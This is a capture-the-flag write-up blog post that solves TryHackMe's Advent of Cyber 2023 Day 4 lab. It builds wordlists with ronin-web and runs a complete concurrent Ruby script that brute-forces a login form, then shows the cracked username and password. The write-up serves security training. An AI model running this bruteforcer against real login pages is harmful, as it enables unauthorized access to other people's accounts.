---
layout: post
title: Solving Advent of Cyber 2023 Day 4 using Ronin
author: postmodern
tags:
  - adventofcyber
  - adventofcyber2023
  - ctf
  - tryhackme
  - ruby
  - ronin
  - writeup
---

This year I decided to try using Ronin to solve the [Advent of Cyber 2023]
challenges. Let's see how far I can get.

The Day 4 challenge is also a bruteforcing challenge like Day 3, but this time
we have to bruteforce the username and password for a login form. The
instructions for the challenge recommends using [CeWL] to spider the website
and build a custom words, and then use [wfuzz] to bruteforce the login form
until we get a successful login response. Instead of using [CeWL], we will
use [ronin-web]'s brand new `wordlist` command to spider the website and build
the custom wordlist. The `ronin-web wordlist` command leverages the
battle-tested [spidr] library and has many more options than [CeWL].

First we will need to use `ronin-web wordlist` to spider the website and create
a custom wordlist of possible usernames. The instructions for the challenge
hint that we should generate a wordlist containing lowercase usernames.

```shell
ronin-web wordlist --site http://10.10.223.131 -o usernames.txt --normalize-case
```

Next we will need to spider the website again and generate a custom wordlist of
possible passwords. The instructions for the challenge hint that we will want
to allow digits and whole numbers in our password wordlist.

```shell
ronin-web wordlist --site http://10.10.223.131 --digits --numbers -o passwords.txt
```

Now that we have our two custom wordlists, we will write a bruteforcing Ruby
script that will send every combination of username and password, until we get a
successful login response. First we will need to determine what an unsuccessful
login attempt HTTP response looks like, so our bruteforcer Ruby script can
ignore those and keep bruteforcing. Attempting to login with the username `foo`
and the password `bar`, and checking the Network tab in Chrome DevTools, we see
a 200 OK response. Hmm that doesn't seem right. The same login page is returned,
but with the text `Please enter the correct credentials`. If a HTTP response
contains the text `Please enter the correct credentials` than we know the
username and password did not work and to try the next username and password.

Another problem is that it takes a while for a HTTP response to be returned for
a login attempt. This means that a single threaded bruterforcer script would
take too long and the machine would likely timeout or expire before we have
found the correct username and password. We need to pull out Ruby's secret
weapon for high-performance I/O, the [async gems][async]. The [async gems]
allow writing asynchronous I/O code that runs in Ruby Fibers, which are
lighter weight than native Threads. When one Ruby Fiber blocks waiting
for data to be received, Ruby can switch to another Fiber; this also means
we don't have to deal with "callback hell". Using the [async gems][async]
we can easily create a pool of worker tasks which consume username/password
combinations from a producer task, sends the HTTP requests, waits for a
response, checks the response and exits if one of the
username/password combinations works.

```ruby
require 'ronin/support'
require 'wordlist'
require 'async'
require 'async/queue'
require 'async/io'

include Ronin::Support

# worker pool size
WORKERS = 100

usernames = Wordlist.open('usernames.txt')
passwords = Wordlist.open('passwords.txt')

ip = ARGV[0]

# the work queue
credentials = Async::LimitedQueue.new(WORKERS)

Async do |task|
  # producer task
  task.async do
    usernames.each do |username|
      passwords.each do |password|
        credentials.enqueue([username, password])
      end
    end

    # send the stop values to the workers
    WORKERS.times { credentials.enqueue(nil) }
  end

  # initialize the worker pool
  WORKERS.times do
    # consumer task
    task.async do
      http = http_connect(ip,80)

      # send the initial request to obtain the session cookie
      response = http.get('/login.php')
      session_cookie = response['Set-Cookie']

      while (username, password = credentials.dequeue)
        print_info "Trying #{username} : #{password} ..."

        response = http.post('/login.php', form_data: {
                                             username: username,
                                             password: password
                                           },
                                           cookie: session_cookie)

        if response.body.include?('Please enter the correct credentials')
          # login failed, keep trying ...
        else
          print_success "Jack Pot! #{username} : #{password}"
          exit 0
        end
      end
    end
  end
end

print_failure "No usernames/passwords worked :("
exit(-1)
```

Now to run the bruteforcing Ruby script against the target machine IP address.
We will add the `--jit` option to speed up our Ruby script as much as possible.

```shell
$ ruby --jit bruteforce.rb 10.10.223.131
```

Now we should see username and password combinations fly past as the
bruteforcing Ruby script hammers the target machine. Eventually you should
find the correct username and password combination:

```
...
[*] Trying security : meticulous ...
[*] Trying security : attention ...
[*] Trying security : detail ...
[+] Jack Pot! isaias : Happiness
```

As you can see, Ronin provides you with powerful commands *and* libraries that
can give you an edge over other pentesting tools.

[Advent of Cyber 2023]: https://tryhackme.com/room/adventofcyber2023
[CeWL]: https://github.com/digininja/CeWL#readme
[wfuzz]: https://github.com/xmendez/wfuzz#readme
[ronin-web]: https://github.com/ronin-rb/ronin-web#readme
[spidr]: https://github.com/postmodern/spidr#readme
[async]: https://socketry.github.io/async/guides/getting-started/index.html
